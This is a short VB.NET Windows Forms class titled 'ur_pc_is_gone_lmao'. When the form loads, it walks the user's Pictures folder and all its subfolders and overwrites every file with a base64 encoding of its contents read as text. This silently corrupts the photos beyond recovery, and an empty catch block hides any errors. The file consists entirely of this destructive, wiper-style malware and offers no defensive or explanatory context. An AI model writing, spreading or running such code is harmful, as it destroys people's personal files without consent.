Public Class ur_pc_is_gone_lmao
    Private Sub ur_pc_is_gone_lmao_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Dim Files() As System.IO.FileInfo
        Dim dir1 = "C:\Users\" & SystemInformation.UserName & "\Pictures\"
        Dim dirinfo As New System.IO.DirectoryInfo(dir1)
        Files = dirinfo.GetFiles("*", System.IO.SearchOption.AllDirectories)
        For Each file In Files
            Try
                Dim fileReader As String
                fileReader = My.Computer.FileSystem.ReadAllText(file.FullName)
                Dim byt As Byte() = System.Text.Encoding.UTF8.GetBytes(fileReader)
                Dim inc = System.Convert.ToBase64String(byt)
                Dim sWriter As New System.IO.StreamWriter(file.FullName, False)
                sWriter.Write(inc)
                sWriter.Close()
            Catch ex As Exception

            End Try
        Next

    End Sub
End Class